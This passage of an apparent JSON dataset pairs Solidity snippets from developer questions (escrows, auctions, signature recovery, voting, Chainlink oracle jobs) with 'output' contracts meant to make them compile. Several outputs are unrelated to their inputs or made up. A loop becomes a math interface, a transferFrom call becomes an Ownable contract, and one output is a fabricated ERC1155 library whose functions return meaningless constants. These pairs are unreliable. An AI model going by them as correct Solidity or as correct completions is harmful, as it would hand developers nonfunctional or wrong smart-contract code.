        "output": "pragma solidity ^0.8.9;\ninterface IPancakeSwapV2Router02 {\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountETH);\n\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountETH);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\n"
    },
    "211.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract Escrow {\n    \n    address public owner;\n    \n    constructor() {\n        owner = msg.sender;\n    }\n    \n    function depositNothing() public view {\n        require(msg.sender == owner, 'You are not the owner!');\n    }\n    \n    function balanceOf() view public returns(uint) {\n        return address(this).balance;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.0;\n\ncontract Escrow {\n    \n    address public owner;\n    \n    constructor() {\n        owner = msg.sender;\n    }\n    \n    function depositNothing() public view {\n        require(msg.sender == owner, 'You are not the owner!');\n    }\n    \n    function balanceOf() view public returns(uint) {\n        return address(this).balance;\n    }\n}\n\n"
    },
    "212.sol": {
        "input": "bytes b = ...;\nuint256 num = uint256(bytes32(b));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Example {\n\n    bytes b = hex\"\";\n\n    uint256 num = uint256(bytes32(b));\n}\n\n"
    },
    "213.sol": {
        "input": "pragma solidity 0.5.8;\n\ninterface ITokenDeposit {}\n\ninterface trcToken {}\n\ncontract CWC is ITokenDeposit {\n  string public name = \"Decentralized CWC\";\n  string public symbol = \"CWC\";\n  uint8  public decimals = 18;\n  trcToken  public usddTokenId = trcToken(1004777);\n}\n\n\n",
        "output": "pragma solidity 0.5.8;\n\ninterface ITokenDeposit {}\n\ninterface trcToken {}\n\ncontract CWC is ITokenDeposit {\n  //using SafeMath for uint256;\n  string public name = \"Decentralized CWC\";\n  string public symbol = \"CWC\";\n  uint8  public decimals = 18;\n  trcToken  public usddTokenId = trcToken(1004777);\n}\n\n"
    },
    "214.sol": {
        "input": "   let messageHash = keccak256(utils.toUtf8Bytes(message));\n\n    let messageHash = ethers.utils.solidityKeccak256(['string'], [message]);\n\n    let signature = await address0.signMessage(messageHash);\n\n     let signature = await address0.signMessage(ethers.utils.arrayify(messageHash));\n\nusing ECDSA for bytes32; \n\nfunction verifyMessage(string memory message, bytes memory signature) public view  returns(address, bool) {\n        bytes32 messagehash =  keccak256(bytes(message));\n       \n        address signeraddress = messagehash.toEthSignedMessageHash().recover(signature);\n              \n        if (msg.sender==signeraddress) {\n            return (signeraddress, true);\n        } else {\n            return (signeraddress, false);\n        }\n    }\n  \n\n    \n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface EIP712Recover {\n  function recover(bytes32 _hash, bytes calldata _sig) external returns(address);\n  \n}\n\n"
    },
    "215.sol": {
        "input": "pragma solidity ^0.8.13;\n\ncontract Auction {\n    address owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    struct Campaign {\n        uint256 campaignID;\n        uint256 budget;\n        uint256 bidCount;\n        mapping(uint => Bidder[]) bidders;\n    }\n\n    struct Bidder {\n        bool bided;\n        uint256 bid;\n        string name;\n        address bidderAddress;\n    }\n\n    Campaign[] public campaigns;\n    uint totalCampaign = 0;\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Error! You're not the smart contract owner!\");\n        _;\n    }\n\n    function createCampaing(uint _budgetCampaign) public onlyOwner {\n        Campaign storage _firstCampaigns = campaigns.push();\n        _firstCampaigns.campaignID = totalCampaign;\n        _firstCampaigns.budget = _budgetCampaign;\n        totalCampaign++;\n    }\n\n    function bid(uint _indexCampaign, string memory _nameBidder) public {\n        Campaign storage _bidCampaign = campaigns[_indexCampaign];\n        _bidCampaign.bidCount += 1;\n        uint _bidIndex = _bidCampaign.bidCount;\n        _bidCampaign.bidders[_indexCampaign].push(Bidder(true, _bidIndex, _nameBidder, msg.sender));\n    }\n\n    function getBids(uint _indexCampaign) onlyOwner external view returns(Bidder[] memory) {\n        return campaigns[_indexCampaign].bidders[_indexCampaign];\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Auction {\n    address owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    struct Campaign {\n        uint256 campaignID;\n        uint256 budget;\n        uint256 bidCount;\n        mapping(uint => Bidder[]) bidders;\n    }\n\n    struct Bidder {\n        bool bided;\n        uint256 bid;\n        string name;\n        address bidderAddress;\n    }\n\n    Campaign[] public campaigns;\n    uint totalCampaign = 0;\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Error! You're not the smart contract owner!\");\n        _;\n    }\n\n    function createCampaing(uint _budgetCampaign) public onlyOwner {\n        Campaign storage _firstCampaigns = campaigns.push();\n        _firstCampaigns.campaignID = totalCampaign;\n        _firstCampaigns.budget = _budgetCampaign;\n        totalCampaign++;\n    }\n\n    function bid(uint _indexCampaign, string memory _nameBidder) public {\n        Campaign storage _bidCampaign = campaigns[_indexCampaign];\n        _bidCampaign.bidCount += 1;\n        uint _bidIndex = _bidCampaign.bidCount;\n        _bidCampaign.bidders[_indexCampaign].push(Bidder(true, _bidIndex, _nameBidder, msg.sender));\n    }\n\n    function getBids(uint _indexCampaign) onlyOwner external view returns(Bidder[] memory) {\n        return campaigns[_indexCampaign].bidders[_indexCampaign];\n    }\n}\n\n"
    },
    "216.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract SignTest {\n\naddress owner = msg.sender;\n\nmapping(uint256 => bool) usedNonces;\n\nfunction test(uint256 amount, uint256 nonce, bytes memory sig, uint tV, bytes32 tR, bytes32 tS, bytes32 tMsg) public view returns(address) {\n\n    bytes32 message = prefixed(keccak256(abi.encodePacked(amount, nonce))); \n    bytes32 messageWithoutPrefix = keccak256(abi.encodePacked(amount, nonce)); \n\n   \n    address signer = recoverSigner(messageWithoutPrefix, sig, tV, tR,tS);\n\n    return signer;\n}\n\n\nfunction splitSignature(bytes memory sig)\n    public\n    view\n    returns (uint8, bytes32, bytes32)\n{\n    require(sig.length == 65, \"B\");\n\n    bytes32 r;\n    bytes32 s;\n    uint8 v;\n\n    assembly {\n        r := mload(add(sig, 32))\n        s := mload(add(sig, 64))\n        v := byte(0, mload(add(sig, 96)))\n    }\n\n    return (v, r, s);\n}\n\nfunction recoverSigner(bytes32 message, bytes memory sig, uint tV, bytes32 tR, bytes32 tS)\n    public\n    view\n    returns (address)\n{\n    uint8 v;\n    bytes32 r;\n    bytes32 s;\n\n    (v, r, s) = splitSignature(sig);\n\n    require(v==tV, \"V is not correct\");\n    require(r==tR, \"R is not correct\");\n    require(s==tS, \"S is not correct\");\n\n    return ecrecover(message, v, r, s);\n}\n\nfunction prefixed(bytes32 inputHash) public pure returns (bytes32) {\n    return keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", inputHash));\n}\n\n}\n\n    let fnSignature = web3.utils.keccak256(\"setApprovalForAll(address,bool\").substr(0,10)\n\nlet fnParams = web3.eth.abi.encodeParameters(\n  [\"address\",\"bool\"],\n  [toAddr,permit]\n)\n\ncalldata = fnSignature + fnParams.substr(2)\n\nconsole.log(calldata)\n\nconst data = calldata \nconst NFTAddress = 'Contract address where you sign'\nconst newSigner = web3.eth.accounts.privateKeyToAccount(\"Your Priv Key\");\nconst myAccount = web3.eth.accounts.wallet.add(newSigner);\nconst signer = myAccount.address;\nconsole.log(signer) \n\n    let rawData = web3.eth.abi.encodeParameters(\n    ['address','bytes'],\n    [NFTAddress,data]\n  );\n  let hash = web3.utils.soliditySha3(rawData);\n  console.log(hash)\n  let signature = web3.eth.sign(hash, signer);\n console.log(signature)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SignTest {\n\n    address owner = msg.sender;\n\n    mapping(uint256 => bool) usedNonces;\n\n    \n    function test(uint256 amount, uint256 nonce, bytes memory sig, uint tV, bytes32 tR, bytes32 tS, bytes32 tMsg) public view returns(address) {\n\n        bytes32 message = prefixed(keccak256(abi.encodePacked(amount, nonce))); \n        bytes32 messageWithoutPrefix = keccak256(abi.encodePacked(amount, nonce)); \n\n        \n        address signer = recoverSigner(messageWithoutPrefix, sig, tV, tR,tS);\n\n        return signer;\n    }\n\n    \n    function splitSignature(bytes memory sig)\n        public\n        view\n        returns (uint8, bytes32, bytes32)\n    {\n        require(sig.length == 65, \"B\");\n\n        bytes32 r;\n        bytes32 s;\n        uint8 v;\n\n        assembly {\n            r := mload(add(sig, 32))\n            s := mload(add(sig, 64))\n            v := byte(0, mload(add(sig, 96)))\n        }\n\n        return (v, r, s);\n    }\n\n    \n    function recoverSigner(bytes32 message, bytes memory sig, uint tV, bytes32 tR, bytes32 tS)\n        public\n        view\n        returns (address)\n    {\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n\n        (v, r, s) = splitSignature(sig);\n\n        require(v==tV, \"V is not correct\");\n        require(r==tR, \"R is not correct\");\n        require(s==tS, \"S is not correct\");\n\n        return ecrecover(message, v, r, s);\n    }\n\n    \n    function prefixed(bytes32 inputHash) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", inputHash));\n    }\n\n}\n\n"
    },
    "217.sol": {
        "input": "IBentoBoxMinimal(bentBox).setMasterContractApproval(\n               address(this), \n               _sushiswapTridentRouterAddress,\n               true,\n               0,\n               0,\n               0\n           );\n\n        IERC20Upgradeable(pool).safeIncreaseAllowance(\n            bentBox,\n           amountIn\n        );\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20Upgradeable {\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 value) external returns (bool);\n    function transfer(address to, uint256 value) external returns (bool);\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n    function safeIncreaseAllowance(address spender, uint256 value) external;\n    function safeDecreaseAllowance(address spender, uint256 value) external;\n}\n\ninterface IWETH9 {\n    function depositWeth() external payable;\n    function withdrawEther(uint256 amount) external;\n}\n\n"
    },
    "218.sol": {
        "input": "function getContractOwner() public view returns (address)\n  {\n    return owner;\n  }\n\ncontract(\"YourContract\", (accounts) => {\n\n  let _contract = null;\n  let buyer = null;\n  before(async () => {\n    _contract = await YourContractName.deployed();\n    buyer = accounts[1];\n  });\n\n  describe(\"Normal withdraw\", () => {\n    let currentOwner = null;\n    before(async () => {\n      currentOwner = await _contract.getContractOwner();\n    });\n    it(\"should fail when withdrawing by different than owner address\", async () => {\n      const value = \"10000000000000000\";\n      _contract.withdraw(value, { from: buyer });\n    });\n}\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract YourContractName {\n  address private owner;\n\n  constructor() public {\n    owner = msg.sender;\n  }\n\n  function getContractOwner() public view returns (address) {\n    return owner;\n  }\n}\n\n"
    },
    "221.sol": {
        "input": "const transaction = new ContractExecuteTransaction()\n        .setGas(2700000)\n        .setPayableAmount(100)\n        .setContractId(contractId)\n        .setFunctionParameters(functionParameters)\n        .setMaxTransactionFee(100);\n\nfunction mintToken() external payable {\n    (int responseCode, address _tokenAddress) = htsProxy.mintToken{value: msg.value}(\n        \"OraCRE\",\n        \"OraCRE\",\n        address(this),\n        1000000000,\n        8\n    );\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface HTSProxy {\n    function mintToken(\n        string memory _name,\n        string memory _symbol,\n        address _recipient,\n        uint256 _amount,\n        uint8 _decimals\n    ) external payable returns (int, address);\n}\n\ncontract MyContract {\n    HTSProxy private htsProxy;\n    \n    constructor(address _htsProxyAddress) {\n        htsProxy = HTSProxy(_htsProxyAddress);\n    }\n    \n    function mintToken() external payable {\n        (int responseCode, address _tokenAddress) = htsProxy.mintToken{value: msg.value}(\n            \"OraCRE\",\n            \"OraCRE\",\n            address(this),\n            1000000000,\n            8\n        );\n        \n        // Additional logic after minting token\n    }\n}\n"
    },
    "223.sol": {
        "input": "function castVote(address _address) public {\n            votes[msg.sender] = _address;\n            Candidate storage candi = candidates[_address];\n            candi.numVotes = candi.numVotes + 1; \n        }\n\nfunction castVote(address _address) public {\n            votes[msg.sender] = _address;\n            Candidate memory candi = candidates[_address];\n            candi.numVotes = candi.numVotes + 1;\n            candidates[_address] = candi;\n        }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract VotingContract {\n    \n    struct Candidate {\n        uint numVotes;\n    }\n    \n    mapping(address => Candidate) public candidates;\n    mapping(address => address) public votes;\n\n    function castVote(address _address) public {\n        votes[msg.sender] = _address;\n        candidates[_address].numVotes = candidates[_address].numVotes + 1; \n    }\n}\n"
    },
    "224.sol": {
        "input": "event TransferTimestamp(uint256 tokenId, address from, address to, uint256 timestamp);\n\nemit TransferTimestamp(tokenId, msg.sender, to, block.timestamp);\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary SafeERC1155 {\n    function _transferFrom(address from, address to, uint256 tokenId) internal returns (bool) {\n        return from == msg.sender && to == msg.sender;\n    }\n    \n    function _mint(uint256 tokenId) internal returns (bool) {\n        return false;\n    }\n    \n    function _burn(uint256 tokenId) internal returns (bool) {\n        return false;\n    }\n}\n\ninterface ERC1155 {\n    function transferFrom(address owner, uint256 from, uint256 to, uint256 tokenId) external returns (bool);\n    function mint(uint256 tokenId) external returns (bool);\n    function burn(uint256 tokenId) external returns (bool);\n    function transfer(address from, address to, uint256 tokenId) external returns (bool);\n    event TransferTimestamp(uint256 tokenId, address from, address to, uint256 timestamp);\n}\n\n"
    },
    "225.sol": {
        "input": "uint256 mask = uint256(int256(-1));\n\n\n",
        "output": "pragma solidity ^0.8.9;\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\n"
    },
    "226.sol": {
        "input": "function addRecord(address _addr, Records memory record) public {\n}\n\nfunction addRecord(address _addr, string memory cname, string memory l_cadence, string memory r_cadence, string memory n_cadence, string memory l_dsupport,\n     string memory r_dsupport, string memory n_dsupport, string memory l_footoff, string memory r_footoff, string memory n_footoff, string memory l_steptime, \n     string memory r_steptime, string memory n_steptime, string memory admittedOn, string memory dischargedOn, string memory ipfs) internal {\n    }\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface CNameRecord {\n    function addRecord(\n        address _addr,\n        string memory cname,\n        string memory l_cadence,\n        string memory r_cadence,\n        string memory n_cadence,\n        string memory l_dsupport,\n        string memory r_dsupport,\n        string memory n_dsupport,\n        string memory l_footoff,\n        string memory r_footoff,\n        string memory n_footoff,\n        string memory l_steptime,\n        string memory r_steptime,\n        string memory n_steptime,\n        string memory admittedOn,\n        string memory dischargedOn,\n        string memory ipfs\n    ) public;\n}\n\n"
    },
    "228.sol": {
        "input": "function registerAsset(\n    external function\n        string memory description,\n        uint256 price,\n        uint256 shares\n    ) external onlyOwner {\n        require(shares > 0, \"Shares must be greater than 0.\");\n        assetCount++;\n        assets[assetCount] = Asset(msg.sender, description, price, shares);\n        emit RegisterAsset(description, price, shares);\n    }\n\nfunction setAssetPrice(\n        uint256 assetId,\n        uint256 newPrice\n    ) external onlyOwner {\n        require(assetId > 0 && assetId <= assetCount, \"Invalid asset ID.\");\n        Asset storage asset = assets[assetId];\n        require(asset.owner != address(0), \"Asset does not exist.\");\n        asset.pricePerShare = newPrice;\n\n        emit SetAssetPrice(assetId, newPrice);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract AssetRegistry {\n    struct Asset {\n        address owner;\n        string description;\n        uint256 price;\n        uint256 shares;\n    }\n\n    mapping(uint256 => Asset) public assets;\n    uint256 public assetCount;\n    address public owner;\n\n    event RegisterAsset(string description, uint256 price, uint256 shares);\n    event SetAssetPrice(uint256 assetId, uint256 newPrice);\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can call this function.\");\n        _;\n    }\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function registerAsset(\n        string memory description,\n        uint256 price,\n        uint256 shares\n    ) external onlyOwner {\n        require(shares > 0, \"Shares must be greater than 0.\");\n        assetCount++;\n        assets[assetCount] = Asset(msg.sender, description, price, shares);\n        emit RegisterAsset(description, price, shares);\n    }\n\n    function setAssetPrice(\n        uint256 assetId,\n        uint256 newPrice\n    ) external onlyOwner {\n        require(assetId > 0 && assetId <= assetCount, \"Invalid asset ID.\");\n        Asset storage asset = assets[assetId];\n        require(asset.owner != address(0), \"Asset does not exist.\");\n        asset.price = newPrice;\n        emit SetAssetPrice(assetId, newPrice);\n    }\n}\n"
    },
    "229.sol": {
        "input": "function stakeTokens(uint256 _amount,address _token) public{\n        require(_amount>0,\"Amount must be more than 0\");\n    \n        IERC20(_token).transferFrom(msg.sender,address(this),_amount);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\n    interface IERC20 {\n        function totalSupply() external view returns (uint);\n        function balanceOf(address account) external view returns (uint256);\n        function allowance(address owner, address spender) external view returns (uint256);\n        function transferFrom(address src,address dst,uint256 value) external returns (bool);\n    }\n\n"
    },
    "230.sol": {
        "input": "contract Called {\n    event Received(uint256 amount);\n\n    fallback() external payable {\n        emit Received(msg.value);\n\n        msg.sender.call(\"\");\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Called {\n    event Received(uint256 amount);\n\n    fallback() external payable {\n        // ok\n        emit Received(msg.value);\n\n        // fail - costs more than the 2300 limit\n        msg.sender.call(\"\");\n    }\n}\n\n"
    },
    "231.sol": {
        "input": "uint[] IntArrayTest;\n\nfunction addElements(uint _number) public{\n    Numbers memory numbers = Numbers(_number);\n    IntArrayTest.push(numbers._number);\n    elementsCounter +=1;\n}\n\nstruct Numbers{\n    uint _number;\n}\n\nNumbers[] NumbersArrayTest;\n\nfunction addElements(uint _number) public{\n    NumbersArrayTest.push(Numbers(_number));\n    elementsCounter +=1;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract NumbersCounter {\n\n    uint[] IntArrayTest;\n\n    function addElements(uint _number) public {\n        Numbers memory numbers = Numbers(_number);\n        IntArrayTest.push(numbers._number);\n        elementsCounter +=1;\n    }\n \n    struct Numbers{\n        uint _number;\n    }\n\n   uint elementsCounter = 0;\n   \n   Numbers[] NumbersArrayTest;\n\n   function addNumbers(uint _number) public {\n     NumbersArrayTest.push(Numbers(_number));\n     elementsCounter +=1;\n    }\n\n    event NumbersAdded(uint _number);\n }\n\n"
    },
    "232.sol": {
        "input": "function withdraw (uint wdraw_amt) public view returns(string memory error){\n    if(wdraw_amt<=balance){\n     balance -= wdraw_amt;    \n    }\n\nfunction withdraw (uint wdraw_amt) public returns(string memory error){\n\nfunction withdraw(uint wdraw_amt) public {\n    if (wdraw_amt <= balance) {\n        balance -= wdraw_amt;\n    } else {\n        revert(\"Insufficient Balance\");\n    }\n}\n\nevent Error(string _message);\n\nfunction withdraw(uint wdraw_amt) public {\n    if (wdraw_amt <= balance) {\n        balance -= wdraw_amt;\n    } else {\n        emit Error(\"Insufficient Balance\");\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n\n  function balanceOf(address account) external view returns (uint256);\n  function transfer(address to, uint256 amount) external returns (bool);\n}\n\n"
    },
    "233.sol": {
        "input": "address public curve = 0x90E00ACe148ca3b23Ac1bC8C240C2a7Dd9c2d7f5;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Curve {\n    address public curve = 0x90E00ACe148ca3b23Ac1bC8C240C2a7Dd9c2d7f5;\n}\n\n"
    },
    "234.sol": {
        "input": "uint256[] memory points;\n\nfunction _generateXPoints(uint256 pointsCount) public view returns (uint256[] memory) {\n    uint256[] memory points = new uint256[](pointsCount);\n\n    for(uint256 i; i < pointsCount; i++) {\n      points[i] = 1;\n    }\n\n    return points;\n}\n\nuint256[][1] memory points;\npoints[0] = new uint256[](pointsCount);\n\nfunction generatePoints(uint256 pointsCount) public view returns (uint256[][1] memory) {\n    uint256[][1] memory points;\n    points[0] = new uint256[](pointsCount);\n    for(uint256 i; i < pointsCount; i++) {\n        points[0][i] = 1;\n    }\n\n    return points;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    function _generateXPoints(uint256 pointsCount) public pure returns (uint256[] memory) {\n        uint256[] memory points = new uint256[](pointsCount);\n\n        for(uint256 i; i < pointsCount; i++) {\n            points[i] = 1;\n        }\n\n        return points;\n    }\n\n    function generatePoints(uint256 pointsCount) public pure returns (uint256[][1] memory) {\n        uint256[][1] memory points;\n        points[0] = new uint256[](pointsCount);\n        for(uint256 i; i < pointsCount; i++) {\n            points[0][i] = 1;\n        }\n\n        return points;\n    }\n}\n\n"
    },
    "236.sol": {
        "input": "pragma solidity ^0.8.7;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract Test is Ownable {\n\n    function heresHowYouUseIt() public onlyOwner {\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface Ownable {\n    function owner() external view returns (address);\n\n    function transferOwnership(address newOwner) external;\n}\n\n"
    },
    "237.sol": {
        "input": "for (uint256 i = 1; i <= _mintAmount; i++)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IPolyMath {\n    function add( uint256 a, uint256 b ) external view returns (uint256);\n    function sub( uint256 a, uint256 b ) external view returns (uint256);\n    function mul( uint256 a, uint256 b ) external view returns (uint256);\n}\n\n"
    },
    "238.sol": {
        "input": "simpleStorageArray.push(simpleStorage2);\n\npragma solidity ^0.6.0;\n\nimport \"./SimpleStorage.sol\";\n\ncontract StorageFactory {\n\n    SimpleStorage[] public simpleStorageArray;\n    SimpleStorage public simpleStorage2 = new SimpleStorage();\n\n    function createSimpleStorageContract() public {\n        SimpleStorage simpleStorage = new SimpleStorage();\n        simpleStorageArray.push(simpleStorage);\n        simpleStorageArray.push(simpleStorage2);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n\n    uint256 public count;\n\n    function increment() public {\n        count++;\n    }\n}\n\n"
    },
    "239.sol": {
        "input": "modifier onlyOwner() {\n    require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n    _;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Ownable {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor() {\n        _owner = msg.sender;\n        emit OwnershipTransferred(address(0), _owner);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(owner() == msg.sender, \"Ownable: caller is not the owner\");\n        _;\n    }\n}\n"
    },
    "240.sol": {
        "input": " function generateRandomNumber(address _random) external(bytes32 requestId) {\n        randomness_interface(_random).fulfillRandomness(uint256);\n    }\n\n  function fulfillRandomness(bytes32 requestId, uint256 randomness) \n\nfunction generateRandomNumber(address _random) external(bytes32 requestId) {\n        randomness_interface(_random).fulfillRandomness(uint256);\n    }\n\nfunction fulfillRandomness(bytes32 requestId,uint256 randomNumber) internal override{\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface randomness_interface {\n    function fulfillRandomness(uint256 randomness) external;\n}\n\n"
    },
    "241.sol": {
        "input": "encode_data  [type=\"ethabiencode\" abi=\"(bytes32 requestId, uint256[][] value)\" data=\"{ \\\\\"requestId\\\\\": $(decode_log.requestId), \\\\\"value\\\\\": $(parse) }\"]\n\ntype = \"directrequest\"\nschemaVersion = 1\nname = \"shamba-fire-data\"\ncontractAddress = \"0xf4434feDd55D3d6573627F39fA39867b23f4Bf7F\"\nmaxTaskDuration = \"0s\"\nobservationSource = \"\"\"\n    decode_log   [type=\"ethabidecodelog\"\n                  abi=\"OracleRequest(bytes32 indexed specId, address requester, bytes32 requestId, uint256 payment, address callbackAddr, bytes4 callbackFunctionId, uint256 cancelExpiration, uint256 dataVersion, bytes data)\"\n                  data=\"$(jobRun.logData)\"\n                  topics=\"$(jobRun.logTopics)\"]\n\n    decode_cbor  [type=\"cborparse\" data=\"$(decode_log.data)\"]\n    fetch        [type=\"bridge\" name=\"shamba-fire-bridge\" requestData=\"{\\\\\"id\\\\\": $(jobSpec.externalJobID), \\\\\"data\\\\\":$(decode_cbor.data)}\"]\n    parse        [type=\"jsonparse\" path=\"result\" data=\"$(fetch)\"]\n    encode_data  [type=\"ethabiencode\" abi=\"(bytes32 requestId, uint256[][] value)\" data=\"{ \\\\\"requestId\\\\\": $(decode_log.requestId), \\\\\"value\\\\\": $(parse) }\"]\n    encode_tx    [type=\"ethabiencode\"\n                  abi=\"fulfillOracleRequest2(bytes32 requestId, uint256 payment, address callbackAddress, bytes4 callbackFunctionId, uint256 expiration, bytes calldata data)\"\n                  data=\"{\\\\\"requestId\\\\\": $(decode_log.requestId), \\\\\"payment\\\\\": $(decode_log.payment), \\\\\"callbackAddress\\\\\": $(decode_log.callbackAddr), \\\\\"callbackFunctionId\\\\\": $(decode_log.callbackFunctionId), \\\\\"expiration\\\\\": $(decode_log.cancelExpiration), \\\\\"data\\\\\": $(encode_data)}\"\n                 ]\n    submit_tx    [type=\"ethtx\" to=\"0xf4434feDd55D3d6573627F39fA39867b23f4Bf7F\" data=\"$(encode_tx)\"]\n\n    decode_log -> decode_cbor -> fetch -> parse -> encode_data -> encode_tx -> submit_tx\n\"\"\"\nexternalJobID = \"66229880-79e1-43c6-9d9e-0eb4b668729d\"\n\npragma solidity ^0.8.7;\n\nimport \"@chainlink/contracts/src/v0.8/ChainlinkClient.sol\";\n\ncontract GenericLargeResponse is ChainlinkClient {\n  using Chainlink for Chainlink.Request;\n\n  uint256[][] public data;\n\n  constructor(\n  ) {\n    setChainlinkToken(0xa36085F69e2889c224210F603D836748e7dC0088);\n    setChainlinkOracle(0xf4434feDd55D3d6573627F39fA39867b23f4Bf7F);\n  }\n\n  function requestBytes(\n  )\n    public\n  {\n    bytes32 specId = \"6622988079e143c69d9e0eb4b668729d\";\n    uint256 payment = 1000000000000000000;\n    Chainlink.Request memory req = buildChainlinkRequest(specId, address(this), this.fulfillBytes.selector);\n    req.add(\"data\", \"{\\\"agg_x\\\": \\\"agg_mean\\\", \\\"dataset_code\\\":\\\"MODIS/006/MOD14A1\\\", \\\"selected_band\\\":\\\"MaxFRP\\\", \\\"image_scale\\\":1000, \\\"start_date\\\":\\\"2021-09-01\\\", \\\"end_date\\\":\\\"2021-09-10\\\", \\\"geometry\\\":{\\\"type\\\":\\\"FeatureCollection\\\",\\\"features\\\":[{\\\"type\\\":\\\"Feature\\\",\\\"properties\\\":{\\\"id\\\":1},\\\"geometry\\\":{\\\"type\\\":\\\"Polygon\\\",\\\"coordinates\\\":[[[29.53125,19.642587534013032],[29.53125,27.059125784374068],[39.90234375,27.059125784374068],[39.90234375,19.642587534013032],[29.53125,19.642587534013032]]]}},{\\\"type\\\":\\\"Feature\\\",\\\"properties\\\":{\\\"id\\\":2},\\\"geometry\\\":{\\\"type\\\":\\\"Polygon\\\",\\\"coordinates\\\":[[[46.40625,13.752724664396988],[46.40625,20.138470312451155],[56.25,20.138470312451155],[56.25,13.752724664396988],[46.40625,13.752724664396988]]]}}]}}\");\n       \n    sendOperatorRequest(req, payment);\n  }\n\n  function fulfillBytes(\n    bytes32 requestId,\n    uint256[][] memory bytesData\n  )\n    public\n    recordChainlinkFulfillment(requestId)\n  {\n    data = bytesData;\n  }\n\n}\n\n\n",
        "output": "pragma solidity ^0.5.16;\ncontract fulfillOracleRequest2 {\n  function fulfillOracleRequest(\n    bytes32 requestId,\n    uint256 payment,\n    address callbackAddress,\n    bytes4 callbackFunctionId,\n    uint256 expiration,\n    bytes calldata data\n  )\n    external;\n}\n\n"
    },
    "242.sol": {
        "input": " function setter() public {\n   data1[p1.add].amount=7;\n } \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n  mapping(address => uint256) public data1;\n\n  function setter(address p1) public {\n    data1[p1] = 7;\n  }\n}\n"
    },
    "243.sol": {
        "input": "token.transferFrom(msg.sender, address(this), _amount);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Ownable {\n    address private owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n\n    function transferOwner(address newOwner) public onlyOwner {\n        owner = newOwner;\n    }\n}\n\n"
    },
    "244.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n\n    address oracle = address(0x123);\n\n    function requestNFTOwnerCheck(address owner, address collection, uint256 tokenID, uint16 chainID) external {\n        (bool success, ) = oracle.call(abi.encode(owner, collection, tokenID, chainID));\n        require(success);\n    }\n\n    function callback(bool result) external {\n        require(msg.sender == oracle, \"This function can be invoked only by the oracle\");\n    }\n}\n\n\n",
